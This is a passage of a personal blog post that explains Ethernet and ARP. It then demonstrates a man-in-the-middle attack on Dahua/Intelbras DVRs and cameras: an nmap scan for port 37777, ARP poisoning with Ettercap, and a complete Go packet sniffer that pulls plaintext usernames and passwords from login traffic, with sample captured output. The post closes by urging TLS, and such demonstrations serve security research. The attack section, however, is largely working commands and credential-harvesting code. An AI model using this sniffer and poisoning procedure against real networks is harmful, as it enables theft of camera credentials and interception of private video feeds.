+<p>That’s an overview of how a Ethernet communcation works: Your device has a MAC Address and the device you want also does. If you want to communication with someone you need to send the target mac address as well. Imagine that all cables / routers / switches are the courier service. All courier employees need to know where the package will go to decide what is the best route. And you that receives the package will also want to know where the package came from (although the sender fields can come with basically anything, right?)</p>
+
+<p>Now take a deep look: Where is the IP Address on all of that? Well, exactly inside the <em>Payload</em> field. So, how you will send a packet using an IP if you don’t know the destination MAC? That’s where ARP gets in use!</p>
+
+<h2 id="discovering-mac-addresses-using-arp">Discovering MAC Addresses using ARP</h2>
+
+<p>The ARP Protocol was created to discover MAC Addresses over the network. It literally means Address Resolution Protocol. To understand how it works, there is one more detail to understand about Ethernet: The Broadcast Communication.</p>
+
+<p>The concept of broadcast is simple. If the destination address is FF:FF:FF:FF:FF:FF, the packet will be received by <em>all</em> devices in the network. It means that the addressFF:FF:FF:FF:FF:FF is a special address where you say to the courier: send a copy of this letter to everyone — Of course that the real courier would just laugh at you</p>
+
+<p>Knowing this let’s do a mental exercise: Assuming everyone knows its own IP (after all, you usually choose yours), we can simple send a letter to FF:FF:FF:FF:FF:FFwith the following message: Who has the IP XXX.XXX.XXX.XXX? Signed: me, in the address 01:02:03:04:05:06and just wait for a response with the following message: I have the IP XXX.XXX.XXX.XXX. Signed: Me, in the address 06:05:04:03:02:01.</p>
+
+<p>Looks simple right? Well, that’s exactly what ARP does. To help everyone, you will also send your IP Address when asking one (then the destination also knows what is your IP and MAC Address). Let’s see how an ARP Message is composed:</p>
+
+<p><img src="/assets/posts/medium/0_fGg1UDKAtuNfSC5J.png" alt="ARP Request / Reply"><em>ARP Request / Reply</em></p>
+
+<ul>
+  <li>
+    <p><em>Hardware Type</em>: Defines the hardware type (in this case Ethernet)</p>
+  </li>
+  <li>
+    <p><em>Protocol Type</em>: Defines the protocol type (in this case IPv4)</p>
+  </li>
+  <li>
+    <p><em>Hardware Address Length</em>: Defines the length of the hardware address (since we’re on a Ethernet Network, we use MAC Address which has 6 bytes)</p>
+  </li>
+  <li>
+    <p><em>Protocol Address Length</em>: Defines the length of the protocol address (since we’re talking about IPv4 protocol, we use 4 byte IP Addresses)</p>
+  </li>
+  <li>
+    <p><em>Operation Code</em>: Type of the operation. We’re asking who has an IP or sending an answer?</p>
+  </li>
+  <li>
+    <p><em>Source / Target Hardware Address</em>: Source / Destination Hardware Address (in this case MAC). If that’s a question, the destination will be 00:00:00:00:00:00 (if you don’t know, you just send it blank)</p>
+  </li>
+  <li>
+    <p><em>Source / Target Protocol Address</em>: Source / Destination Protocol Address (in this case IP). In that case both are filled even in a question. The source is your IP and destination is the IP you’re looking for.</p>
+  </li>
+</ul>
+
+<p>The flow works more or less like this: You create a ARP Packet with operation Request, filling all fields that you know and Target Protocol Address with the IP you want to find (for example 1.1.1.1) and send it into the network to MAC address FF:FF:FF:FF:FF:FF. The computer that has the IP 1.1.1.1, will answer to you with a ARP packet Replyand Target Hardware Address filled with its mac address. But instead sending toFF:FF:FF:FF:FF:FF it will send directly to you. And if you don’t receive any response after a while, it means no one has that IP (or no one want’s to talk about it).</p>
+
+<p>After that ARP Packet Exchange, both sides know their counter-part address. Then both parts store that information in a memory table called ARP Cache Table, so when it needs to transmit some packet to the IP it doesn’t need to ask again. After that, when your computer wants to send a message to IP 1.1.1.1, it will check in the ARP table to know which MAC has the IP 1.1.1.1 and then build the ethernet data.</p>
+
+<h2 id="arp-poison">ARP Poison</h2>
+
+<p>The ARP Poison is very simple. Everyone in the network receives the ARP Request, so why not when you receive the ARP packet just store in the local table? Then you don’t need to ask when needed. Using that information we can forge a ARP Reply packet saying that we has the IP 1.1.1.1, and then let all the network know that they should send the packets to us. Simple right?</p>
+
+<p>That’s technically simple, but also simple to detect. After all, you will also need to answer with a forged packet everytime someone asks for that IP, and then everyone will receive two ARP Replies (one from you, and one from the real target).</p>
+
+<p>The attack itself is possible because nothing in IP specification says that you can’t have two networks with the same IP in the same network. Not only that, devices will send packets to ALL devices listed in the ARP Table that has the same IP (that’s so beautiful, right?)</p>
+
+<h2 id="finding-the-intelbrasdahua-dvrcamera-in-the-network">Finding the Intelbras/Dahua DVR/Camera in the network</h2>
+
+<p>Our attack is simple. We find our DVR/Camera IPs in the network and act as them. But first we need to find them. For that we can use a peculiar information of Dahua/Intelbras Devices: They always talk in port 37777 using TCP Protocol. Why is that important? It’s because that port is not very common, so if it is open in a device, we can assume its a DVR or Camera. To scan we can use our great friend nmap.</p>
+
+<p>Let’s use my network as an example: 10.10.5.X ( my mask is 255.255.255.0 or /24)</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nmap -sT 10.10.5.0/24 -p 37777 --open
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>-sT makes TCP connections for the specified ports and IPs</p>
+  </li>
+  <li>
+    <p>10.10.5.0/24 tries to connect in all IPs of the specified network( in this case from 10.10.5.1 to 10.10.5.254)</p>
+  </li>
+  <li>
+    <p>-p 37777 tries only in port 37777</p>
+  </li>
+  <li>
+    <p>–open show only results where the por was open</p>
+  </li>
+</ul>
+
+<p>Executing in my network, I have the following result:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Starting Nmap 7.60 ( https://nmap.org ) at 2019-08-02 18:01 -03
+Nmap scan report for 10.10.5.107
+Host is up (-0.085s latency).
+
+PORT      STATE SERVICE
+37777/tcp open  unknown
+MAC Address: 58:10:8C:3B:38:35 (Intelbras)
+
+Nmap done: 256 IP addresses (28 hosts up) scanned in 10.29 seconds
+</code></pre></div></div>
+
+<p>Bingo! We found a Intelbras camera in IP 10.10.5.107. We have our target! Now we just need to do the ARP Poisoning.</p>
+
+<h2 id="poisoning-the-arp-using-ettercap">Poisoning the ARP using Ettercap</h2>
+
+<p>In near future the Go script will also do the ARP Poison. Now I will show how to do it using Ettercap. Ettercap is an excelent application to do several types of attack MitM by ARP, and has some presets to monitor for username/passwords from unencrypted POP/IMAP/SMTP (you would be suprise how easy is to get one). Today we will only use to poison the arp tables in the network and get the packets.</p>
+
+<p>Let’s open the Ettercap with it’s Graphical Interface:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo ettercap -G
+</code></pre></div></div>
+
+<p><img src="/assets/posts/medium/0_RHewbPkuqj3MarME.png" alt=""></p>
+
+<p>To start the process, select the option in menu Sniff -&gt; Unified Sniffing. Select your network interface (in my case wlp3s0, my wireless adapter) and click OK</p>
+
+<p><img src="/assets/posts/medium/0_kA_Xouhltw8P7yC3.png" alt=""></p>
+
+<p>After that, we need to add our target 10.10.5.107 by going toHosts -&gt; Hosts List and scanning for hosts using the option Hosts -&gt; Scan for Hosts. That should list all available IPs in your network</p>
+
+<p><img src="/assets/posts/medium/0_4HDcojF7gvqOGmCW.png" alt=""></p>
+
+<p>In the list we can see our target 10.10.5.107. Then we should clickAdd to Target 1 to inform Ettercap that we want to poison that IP. After that we can start the process by selecting the menu Mitm -&gt; ARP Poisoning e and the optionSniff Remote Connections.</p>
+
+<p><img src="/assets/posts/medium/0_dRenq5UGzWWqDvcB.png" alt=""></p>
+
+<p><img src="/assets/posts/medium/0__pauVOcV0ulgDTtl.png" alt=""></p>
+
+<p>After that, you computer should be already receiving the packets from the target.</p>
+
+<h2 id="receiving-the-username--password">Receiving the Username / Password</h2>
+
+<p>The golang script nowiseeyou.go,(check the end of this page) will analyze any packet your machine receives in port 37777 waiting for a packet that looks like a login packet. To run just download all dependencies using go get and then run:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo go run nowiseeyou.go
+</code></pre></div></div>
+
+<p>After that you should see a message where the program is waiting for packets to arrive:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2019-08-02T18:18:12-03:00|I| Dahua | Opening wlp3s0 in promisc mode
+2019-08-02T18:18:12-03:00|I| Dahua | Waiting
+</code></pre></div></div>
+
+<p>Now you can open the Intelbras / Dahua application in the phone and if everything goes right, you should see the username/password:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2019-08-02T18:18:12-03:00|I| Dahua | Opening wlp3s0 in promisc mode
+2019-08-02T18:18:12-03:00|I| Dahua | Waiting
+2019-08-02T18:19:01-03:00|W| Dahua | GOTCHA! Username: admin - Password: admin
+2019-08-02T18:19:01-03:00|W| Dahua | GOTCHA! Username: admin - Password: admin
+2019-08-02T18:19:02-03:00|W| Dahua | Got login, and stream data. Closing it...
+</code></pre></div></div>
+
+<p>That’s only possible because Dahua/Intelbras Cameras and DVRs communicate in plain text without any type of encryption. Because of that anyone in the same network as you can (specially if it has access to stuff like the Management Port of switches or sysadmins) can read not only the username and password but also the H.264 Video stream that flows in the network.</p>
+
+<p>I hope that this will show you why EVERYTHING should ALWAYS use TLS for communication. Doesn’t matter if it’s just a small IoT device or a Camera System.</p>
+
+<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">package</span> <span class="n">main</span>
+
+<span class="k">import</span> <span class="p">(</span>
+    <span class="s">"bytes"</span>
+    <span class="s">"encoding/binary"</span>
+    <span class="s">"github.com/google/gopacket"</span>
+    <span class="s">"github.com/google/gopacket/pcap"</span>
+    <span class="s">"github.com/quan-to/slog"</span>
+<span class="p">)</span>
+
+<span class="k">var</span> <span class="n">log</span> <span class="o">=</span> <span class="n">slog</span><span class="o">.</span><span class="n">Scope</span><span class="p">(</span><span class="s">"Dahua"</span><span class="p">)</span>
+
+<span class="k">var</span> <span class="n">networkInterface</span> <span class="o">=</span> <span class="s">"wlp3s0"</span>
+
+<span class="k">type</span> <span class="n">LoginPacket</span> <span class="k">struct</span> <span class="p">{</span>
+    <span class="n">PacketType</span> <span class="kt">uint16</span>  <span class="c">// 0x00A0 -- Hardcoded on Dahua</span>
+    <span class="n">Unk0</span>       <span class="kt">uint16</span>  <span class="c">// 0x6000 -- Hardcoded on Dahua</span>
+    <span class="n">Unk1</span>       <span class="kt">uint32</span>  <span class="c">// 0x00000000</span>
+    <span class="n">Username</span>   <span class="p">[</span><span class="m">8</span><span class="p">]</span><span class="kt">byte</span> <span class="c">// admin</span>
+    <span class="n">Password</span>   <span class="p">[</span><span class="m">8</span><span class="p">]</span><span class="kt">byte</span> <span class="c">// admin</span>
+    <span class="n">Unk2</span>       <span class="kt">uint32</span>  <span class="c">// 0x00030204</span>
+    <span class="n">Unk3</span>       <span class="kt">uint32</span>  <span class="c">// 0xAAA10100</span>
+<span class="p">}</span>
+
+<span class="k">func</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
+
+    <span class="n">log</span><span class="o">.</span><span class="n">Info</span><span class="p">(</span><span class="s">"Opening %s in promisc mode"</span><span class="p">,</span> <span class="n">networkInterface</span><span class="p">)</span>
+    <span class="n">handle</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">pcap</span><span class="o">.</span><span class="n">OpenLive</span><span class="p">(</span><span class="n">networkInterface</span><span class="p">,</span> <span class="m">1600</span><span class="p">,</span> <span class="no">true</span><span class="p">,</span> <span class="n">pcap</span><span class="o">.</span><span class="n">BlockForever</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
+        <span class="n">log</span><span class="o">.</span><span class="n">Fatal</span><span class="p">(</span><span class="n">err</span><span class="p">)</span>
+    <span class="p">}</span>
+
+    <span class="n">err</span> <span class="o">=</span> <span class="n">handle</span><span class="o">.</span><span class="n">SetBPFFilter</span><span class="p">(</span><span class="s">"tcp and port 37777"</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
+        <span class="n">log</span><span class="o">.</span><span class="n">Fatal</span><span class="p">(</span><span class="s">"Cannot set filter: %s"</span><span class="p">,</span> <span class="n">err</span><span class="p">)</span>
+    <span class="p">}</span>
+
+    <span class="n">src</span> <span class="o">:=</span> <span class="n">gopacket</span><span class="o">.</span><span class="n">NewPacketSource</span><span class="p">(</span><span class="n">handle</span><span class="p">,</span> <span class="n">handle</span><span class="o">.</span><span class="n">LinkType</span><span class="p">())</span>
+
+    <span class="n">log</span><span class="o">.</span><span class="n">Info</span><span class="p">(</span><span class="s">"Waiting"</span><span class="p">)</span>
+
+    <span class="n">gotLogin</span> <span class="o">:=</span> <span class="no">false</span>
+
+    <span class="k">for</span> <span class="n">packet</span> <span class="o">:=</span> <span class="k">range</span> <span class="n">src</span><span class="o">.</span><span class="n">Packets</span><span class="p">()</span> <span class="p">{</span>
+        <span class="n">t</span> <span class="o">:=</span> <span class="n">packet</span><span class="o">.</span><span class="n">TransportLayer</span><span class="p">()</span>
+        <span class="k">if</span> <span class="n">t</span> <span class="o">==</span> <span class="no">nil</span> <span class="p">{</span>
+            <span class="k">continue</span>
+        <span class="p">}</span>
+        <span class="n">payload</span> <span class="o">:=</span> <span class="n">t</span><span class="o">.</span><span class="n">LayerPayload</span><span class="p">()</span>
+
+        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">==</span> <span class="m">0</span> <span class="p">{</span>
+            <span class="k">continue</span>
+        <span class="p">}</span>
+
+        <span class="n">ptype</span> <span class="o">:=</span> <span class="n">binary</span><span class="o">.</span><span class="n">LittleEndian</span><span class="o">.</span><span class="n">Uint16</span><span class="p">(</span><span class="n">payload</span><span class="p">[</span><span class="o">:</span><span class="m">2</span><span class="p">])</span>
+
+        <span class="k">if</span> <span class="n">ptype</span> <span class="o">==</span> <span class="m">0xA0</span> <span class="p">{</span> <span class="c">// Login Packet</span>
+            <span class="n">l</span> <span class="o">:=</span> <span class="o">&amp;</span><span class="n">LoginPacket</span><span class="p">{}</span>
+            <span class="n">err</span> <span class="o">=</span> <span class="n">binary</span><span class="o">.</span><span class="n">Read</span><span class="p">(</span><span class="n">bytes</span><span class="o">.</span><span class="n">NewReader</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span> <span class="n">binary</span><span class="o">.</span><span class="n">LittleEndian</span><span class="p">,</span> <span class="n">l</span><span class="p">)</span>
+            <span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
+                <span class="n">log</span><span class="o">.</span><span class="n">Error</span><span class="p">(</span><span class="s">"Error parsing login packet: %s"</span><span class="p">,</span> <span class="n">err</span><span class="p">)</span>
+                <span class="k">continue</span>
+            <span class="p">}</span>
+            <span class="n">gotLogin</span> <span class="o">=</span> <span class="no">true</span>
+            <span class="n">log</span><span class="o">.</span><span class="n">Warn</span><span class="p">(</span><span class="s">"GOTCHA! Username: %s - Password: %s"</span><span class="p">,</span> <span class="n">l</span><span class="o">.</span><span class="n">Username</span><span class="p">,</span> <span class="n">l</span><span class="o">.</span><span class="n">Password</span><span class="p">)</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="n">ptype</span> <span class="o">==</span> <span class="m">0xBC</span> <span class="o">&amp;&amp;</span> <span class="n">gotLogin</span> <span class="p">{</span>
+            <span class="n">log</span><span class="o">.</span><span class="n">Warn</span><span class="p">(</span><span class="s">"Got login, and stream data. Closing it..."</span><span class="p">)</span>
+            <span class="k">break</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+
+  <hr>
+<div class="fb-comments" data-href="https://lucasteske.dev/2019/10/dahua-intelbras-mitm-attack/" data-width="100%" data-numposts="5"></div>
+
+<hr>
+<div class="sharebuttons">
+  <ul>
+    <li>
+      <p class="sharetitle"> Share this: </p>
+    </li>
+    <li class="reddit">
+      <a href="http://www.reddit.com/submit?url=https://lucasteske.dev/2019/10/dahua-intelbras-mitm-attack/&amp;title=Dahua%20/%20Intelbras%20MitM%20Attack" target="_blank">
+        <svg role="img" viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>Reddit icon</title>
+<path d="M2.204 14.049c-.06.276-.091.56-.091.847 0 3.443 4.402 6.249 9.814 6.249 5.41 0 9.812-2.804 9.812-6.249 0-.274-.029-.546-.082-.809l-.015-.032c-.021-.055-.029-.11-.029-.165-.302-1.175-1.117-2.241-2.296-3.103-.045-.016-.088-.039-.126-.07-.026-.02-.045-.042-.067-.064-1.792-1.234-4.356-2.008-7.196-2.008-2.815 0-5.354.759-7.146 1.971-.014.018-.029.033-.049.049-.039.033-.084.06-.13.075-1.206.862-2.042 1.937-2.354 3.123 0 .058-.014.114-.037.171l-.008.015zm9.773 5.441c-1.794 0-3.057-.389-3.863-1.197-.173-.174-.173-.457 0-.632.176-.165.46-.165.635 0 .63.629 1.685.943 3.228.943 1.542 0 2.591-.3 3.219-.929.165-.164.45-.164.629 0 .165.18.165.465 0 .645-.809.808-2.065 1.198-3.862 1.198l.014-.028zm-3.606-7.573c-.914 0-1.677.765-1.677 1.677 0 .91.763 1.65 1.677 1.65s1.651-.74 1.651-1.65c0-.912-.739-1.677-1.651-1.677zm7.233 0c-.914 0-1.678.765-1.678 1.677 0 .91.764 1.65 1.678 1.65s1.651-.74 1.651-1.65c0-.912-.739-1.677-1.651-1.677zm4.548-1.595c1.037.833 1.8 1.821 2.189 2.904.45-.336.719-.864.719-1.449 0-1.002-.815-1.816-1.818-1.816-.399 0-.778.129-1.09.363v-.002zM2.711 9.963c-1.003 0-1.817.816-1.817 1.818 0 .543.239 1.048.644 1.389.401-1.079 1.172-2.053 2.213-2.876-.302-.21-.663-.329-1.039-.329v-.002zm9.217 12.079c-5.906 0-10.709-3.205-10.709-7.142 0-.275.023-.544.068-.809C.494 13.598 0 12.729 0 11.777c0-1.496 1.227-2.713 2.725-2.713.674 0 1.303.246 1.797.682 1.856-1.191 4.357-1.941 7.112-1.992l1.812-5.524.404.095s.016 0 .016.002l4.223.993c.344-.798 1.138-1.36 2.065-1.36 1.229 0 2.231 1.004 2.231 2.234 0 1.232-1.003 2.234-2.231 2.234s-2.23-1.004-2.23-2.23l-3.851-.912-1.467 4.477c2.65.105 5.047.854 6.844 2.021.494-.464 1.144-.719 1.833-.719 1.498 0 2.718 1.213 2.718 2.711 0 .987-.54 1.886-1.378 2.365.029.255.059.494.059.749-.015 3.938-4.806 7.143-10.72 7.143l-.034.009zm8.179-19.187c-.74 0-1.34.599-1.34 1.338 0 .738.6 1.34 1.34 1.34.732 0 1.33-.6 1.33-1.334 0-.733-.598-1.332-1.347-1.332l.017-.012z"></path></svg>
+      </a>
+    </li>
+    <li class="hn">
+      <a href="http://news.ycombinator.com/submitlink?u=https://lucasteske.dev/2019/10/dahua-intelbras-mitm-attack/&amp;t=Dahua%20/%20Intelbras%20MitM%20Attack" target="_blank">
+        <svg role="img" viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>Y Combinator icon</title>
+<path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"></path></svg>
+      </a>
+    </li>
+    <li class="twitter">
+      <a href="https://twitter.com/intent/tweet?via=lucasteske&url=https://lucasteske.dev/2019/10/dahua-intelbras-mitm-attack/&amp;text=Dahua%20/%20Intelbras%20MitM%20Attack" target="_blank">
+        <svg role="img" viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>Twitter icon</title>
+<path d="M23.954 4.569c-.885.389-1.83.654-2.825.775 1.014-.611 1.794-1.574 2.163-2.723-.951.555-2.005.959-3.127 1.184-.896-.959-2.173-1.559-3.591-1.559-2.717 0-4.92 2.203-4.92 4.917 0 .39.045.765.127 1.124C7.691 8.094 4.066 6.13 1.64 3.161c-.427.722-.666 1.561-.666 2.475 0 1.71.87 3.213 2.188 4.096-.807-.026-1.566-.248-2.228-.616v.061c0 2.385 1.693 4.374 3.946 4.827-.413.111-.849.171-1.296.171-.314 0-.615-.03-.916-.086.631 1.953 2.445 3.377 4.604 3.417-1.68 1.319-3.809 2.105-6.102 2.105-.39 0-.779-.023-1.17-.067 2.189 1.394 4.768 2.209 7.557 2.209 9.054 0 13.999-7.496 13.999-13.986 0-.209 0-.42-.015-.63.961-.689 1.8-1.56 2.46-2.548l-.047-.02z"></path></svg>
+      </a>
+    </li>
+    <li class="linkedin">
+      <a href="https://www.linkedin.com/shareArticle?mini=true&url=https://lucasteske.dev/2019/10/dahua-intelbras-mitm-attack/&amp;title=Dahua%20/%20Intelbras%20MitM%20Attack" target="_blank">
+        <svg role="img" viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>LinkedIn icon</title>
+<path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"></path></svg>
+      </a>
+    </li>
+  </ul>
+</div>
+
+</div>
+
+<div class="pagination">
+  
+    <a href="/2019/12/creating-your-own-gsm-network-with-limesdr/" class="left arrow">←</a>
+  
+  
+    <a href="/2019/06/reverse-engineering-cheap-chinese-vrcam-protocol/" class="right arrow">→</a>
+  
+
+  <a href="#" class="top">Top</a>
+</div>
+
+      <br><br>
+    </main>
+
+    <footer>
+  <span>
+    © <time datetime="2022-12-18 21:07:18 -0300">2022</time> Lucas Teske. Made with Jekyll using the <a href="https://github.com/chesterhow/tale/">Tale</a> theme.
+  </span><br>
+  <span class="site-build">
+    Last build: 2022-12-18 21:07:18 -0300
+  </span>
+</footer>
+
+<script src="/assets/simple-jekyll-search.min.js"></script>
+<script>
+  SimpleJekyllSearch({
+    searchInput: document.getElementById('search-input'),
+    resultsContainer: document.getElementById('results-container'),
+    json: '/search.json',
+    searchResultTemplate: '<li><a href="https://lucasteske.dev{url}">{date} - {title}</a></li>'
+  })
+</script>
+
+<!-- Google Tag Manager (noscript) -->
+<noscript>
+  <iframe src="https://www.googletagmanager.com/ns.html?id=GTM-P2HPZJM" height="0" width="0" style="display:none;visibility:hidden"></iframe>
+</noscript>
+<!-- End Google Tag Manager (noscript) -->
+<!-- AnchorJS -->
+<script src="/assets/anchor.min.js"></script>
+<script>
+  anchors.options.placement = 'left';
+  anchors.add('h1');
+  anchors.add();
+</script>
+<!-- End AnchorJS -->
+<!-- Cloudflare Web Analytics -->
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js" data-cf-beacon='{"token": "6fdff3f05d2847b58d553381bb1e8115"}'></script>
+<!-- End Cloudflare Web Analytics -->
+
+  </body>
+</html>
